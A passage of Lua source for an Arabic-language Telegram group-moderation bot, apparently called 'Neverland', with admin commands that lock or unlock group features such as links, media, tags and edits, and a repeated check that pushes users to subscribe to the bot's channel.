if text == "قفل التعديل" and msg.reply_to_message_id_ == 0 and Constructor(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end 
database:set(bot_id.."Neverland:Lock:edit"..msg.chat_id_,true) 
Reply_Status(msg,msg.sender_user_id_,"lock","*✦┇تم قفـل تعديل*")  
return false
end 
if text == "قفل تعديل الميديا" and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:set(bot_id.."Neverland:Lock:edit"..msg.chat_id_,true) 
Reply_Status(msg,msg.sender_user_id_,"lock","*✦┇تم قفـل تعديل*")  
return false
end 
if text == "قفل الكانسر" and Owner(msg) then 
database:set(bot_id.."Status:lock:kanser"..msg.chat_id_,true) 
Reply_Status(msg,msg.sender_user_id_,"lock","*✦┇ تم قفل الكانسر *")
return false
end 
if text == "فتح الكانسر" and Owner(msg) then 
database:del(bot_id.."Status:lock:kanser"..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"unlock","*✦┇تم فتح الكانسر *")
return false
end 
if text == "قفل الكل" and msg.reply_to_message_id_ == 0 and Constructor(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end  
database:set(bot_id.."Neverland:Lock:tagservrbot"..msg.chat_id_,true)   
list ={"Lock:Bot:kick","Lock:User:Name","Lock:hashtak","Lock:Cmd","Lock:Link","Lock:forward","Lock:Keyboard","Lock:geam","Lock:Photo","Lock:Animation","Lock:Video","Lock:Audio","Lock:vico","Lock:Sticker","Lock:Document","Lock:Unsupported","Lock:Markdaun","Lock:Contact","Lock:Spam"}
for i,lock in pairs(list) do 
database:set(bot_id..'Neverland:'..lock..msg.chat_id_,"del")    
end
Reply_Status(msg,msg.sender_user_id_,"lock","*✦┇تم قفـل جميع الاوامر*")  
return false
end 
--------------------------------------------------------------------------------------------------------------
if text == "فتح الاضافه" and msg.reply_to_message_id_ == 0 and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end 
database:del(bot_id.."Neverland:Lock:AddMempar"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","*✦┇تم فتح اضافة الاعضاء*")  
return false
end 
if text == "فتح الدردشه" and msg.reply_to_message_id_ == 0 and Owner(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end 
database:del(bot_id.."Neverland:Lock:text"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","*✦┇تم فتح الدردشه*")  
return false
end 
if text == "فتح الدخول" and msg.reply_to_message_id_ == 0 and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end 
database:del(bot_id.."Neverland:Lock:Join"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","*✦┇تم فتح دخول الاعضاء*")  
return false
end 
if text == "فتح البوتات" and msg.reply_to_message_id_ == 0 and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end 
database:del(bot_id.."Neverland:Lock:Bot:kick"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","*✦┇تم فـتح البوتات*")  
return false
end 
if text == "فتح البوتات " and msg.reply_to_message_id_ == 0 and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end 
database:del(bot_id.."Neverland:Lock:Bot:kick"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","\n*✦┇تم فـتح البوتات*")  
return false
end 
if text == "فتح الاشعارات" and msg.reply_to_message_id_ == 0 and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end  
database:del(bot_id.."Neverland:Lock:tagservr"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","*✦┇تم فـتح الاشعارات*")  
return false
end 
if text == "فتح التثبيت" and msg.reply_to_message_id_ == 0 and Constructor(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end 
database:del(bot_id.."Neverland:lockpin"..msg.chat_id_)  
database:srem(bot_id.."Neverland:Lock:pin",msg.chat_id_)
Reply_Status(msg,msg.sender_user_id_,"unlock","*✦┇تم فـتح التثبيت هنا*")  
return false
end 
if text == "فتح التعديل" and msg.reply_to_message_id_ == 0 and Constructor(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end 
database:del(bot_id.."Neverland:Lock:edit"..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"unlock","*✦┇تم فـتح تعديل*")  
return false
end 
if text == "فتح التعديل الميديا" and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:del(bot_id.."Neverland:Lock:edit"..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"unlock","*✦┇تم فـتح تعديل*")  
return false
end 
if text == "فتح الكل" and msg.reply_to_message_id_ == 0 and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end 
database:del(bot_id.."Neverland:Lock:tagservrbot"..msg.chat_id_)   
list ={"Lock:Bot:kick","Lock:User:Name","Lock:hashtak","Lock:Cmd","Lock:Link","Lock:forward","Lock:Keyboard","Lock:geam","Lock:Photo","Lock:Animation","Lock:Video","Lock:Audio","Lock:vico","Lock:Sticker","Lock:Document","Lock:Unsupported","Lock:Markdaun","Lock:Contact","Lock:Spam"}
for i,lock in pairs(list) do 
database:del(bot_id..'Neverland:'..lock..msg.chat_id_)    
end
Reply_Status(msg,msg.sender_user_id_,"unlock","*✦┇تم فـتح جميع الاوامر*")  
return false
end 
--------------------------------------------------------------------------------------------------------------
if text == "قفل الروابط" and Owner(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:set(bot_id.."Neverland:Lock:Link"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","*✦┇تم قفـل الروابط*")  
return false
end 
if text == "قفل الروابط بالتقيد" and Owner(msg) then
database:set(bot_id.."Neverland:Lock:Link"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","*✦┇تم قفـل الروابط*")  
return false
end 
if text == "قفل الروابط بالكتم" and Owner(msg) then
database:set(bot_id.."Neverland:Lock:Link"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","*✦┇تم قفـل الروابط*")  
return false
end 
if text == "قفل الروابط بالطرد" and Owner(msg) then
database:set(bot_id.."Neverland:Lock:Link"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","*✦┇تم قفـل الروابط*")  
return false
end 
if text == "فتح الروابط" and Owner(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:del(bot_id.."Neverland:Lock:Link"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","*✦┇تم فتح الروابط*")  
return false
end 
if text == "قفل المعرفات" and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:set(bot_id.."Neverland:Lock:User:Name"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","*✦┇تم قفـل المعرفات*")  
return false
end 
if text == "قفل المعرفات بالتقيد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:User:Name"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","*✦┇تم قفـل المعرفات*")  
return false
end 
if text == "قفل المعرفات بالكتم" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:User:Name"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","*✦┇تم قفـل المعرفات*")  
return false
end 
if text == "قفل المعرفات بالطرد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:User:Name"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","*✦┇تم قفـل المعرفات*")  
return false
end 
if text == "فتح المعرفات" and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:del(bot_id.."Neverland:Lock:User:Name"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","*✦┇تم فتح المعرفات*")  
return false
end 
if text == "قفل التاك" and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:set(bot_id.."Neverland:Lock:hashtak"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","*✦┇تم قفـل التاك*")  
return false
end 
if text == "قفل التاك بالتقيد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:hashtak"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","*✦┇تم قفـل التاك*")  
return false
end 
if text == "قفل التاك بالكتم" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:hashtak"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","*✦┇تم قفـل التاك*")  
return false
end 
if text == "قفل التاك بالطرد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:hashtak"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","*✦┇تم قفـل التاك*")  
return false
end 
if text == "فتح التاك" and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:del(bot_id.."Neverland:Lock:hashtak"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","*✦┇تم فتح التاك*")  
return false
end 
if text == "قفل الشارحه" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Cmd"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","*✦┇تم قفـل الشارحه*")  
return false
end 
if text == "قفل الشارحه بالتقيد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Cmd"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","*✦┇تم قفـل الشارحه*")  
return false
end 
if text == "قفل الشارحه بالكتم" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Cmd"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","*✦┇تم قفـل الشارحه*")  
return false
end 
if text == "قفل الشارحه بالطرد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Cmd"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","*✦┇تم قفـل الشارحه*")  
return false
end 
if text == "فتح الشارحه" and Addictive(msg) then
database:del(bot_id.."Neverland:Lock:Cmd"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","*✦┇تم فتح الشارحه*")  
return false
end 
if text == "تعطيل المسح التلقائي" or text == "تعطيل المسح" and Owner(msg) then        
database:set(bot_id.."y:Neverland:msg:media"..msg.chat_id_,true)
Reply_Status(msg,msg.sender_user_id_,"lock",'*✦┇تم تعطيل المسح التلقائي للميديا*')
return false
end 
if text == "تفعيل المسح التلقائي" or text == "تفعيل المسح" and Owner(msg) then        
database:del(bot_id.."y:Neverland:msg:media"..msg.chat_id_)
Reply_Status(msg,msg.sender_user_id_,"lock",'*✦┇تم تفعيل المسح التلقائي للميديا*')
return false
end 
if text == "قفل الصور"and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Photo"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","✦┇تم قفـل الصور")  
return false
end 
if text == "قفل الاباحي"and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Xn"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","✦┇تم قفـل الاباحي")  
return false
end 
if text == "قفل الصور بالتقيد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Photo"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","✦┇تم قفـل الصور")  
return false
end 
if text == "قفل الصور بالكتم" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Photo"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","✦┇تم قفـل الصور")  
return false
end 
if text == "قفل الصور بالطرد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Photo"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","✦┇تم قفـل الصور")  
return false
end 
if text == "فتح الصور" and Addictive(msg) then
database:del(bot_id.."Neverland:Lock:Photo"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","✦┇تم فتح الصور")  
return false
end 
if text == "فتح الاباحي" and Addictive(msg) then
database:del(bot_id.."Neverland:Lock:Xn"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","✦┇تم فتح الاباحي")  
return false
end 
if text == "قفل الفيديو" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Video"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","✦┇تم قفـل الفيديو")  
return false
end 
if text == "قفل الفيديو بالتقيد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Video"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","✦┇تم قفـل الفيديو")  
return false
end 
if text == "قفل الفيديو بالكتم" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Video"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","✦┇تم قفـل الفيديو")  
return false
end 
if text == "قفل الفيديو بالطرد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Video"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","✦┇تم قفـل الفيديو")  
return false
end 
if text == "فتح الفيديو" and Addictive(msg) then
database:del(bot_id.."Neverland:Lock:Video"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","✦┇تم فتح الفيديوو")  
return false
end 
if text == "قفل المتحركه" and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:set(bot_id.."Neverland:Lock:Animation"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","*✦┇تم قفـل المتحركه*")  
return false
end
if text == "قفل المتحركه بالتقيد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Animation"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","*✦┇تم قفـل المتحركه*")  
return false
end 
if text == "قفل المتحركه بالكتم" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Animation"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","*✦┇تم قفـل المتحركه*")  
return false
end 
if text == "قفل المتحركه بالطرد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Animation"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","*✦┇تم قفـل المتحركه*")  
return false
end 
if text == "فتح المتحركه" and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:del(bot_id.."Neverland:Lock:Animation"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","*✦┇تم فتح المتحركه*")  
return false
end 
if text == "قفل الالعاب" and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:set(bot_id.."Neverland:Lock:geam"..msg.chat_id_,"del")  
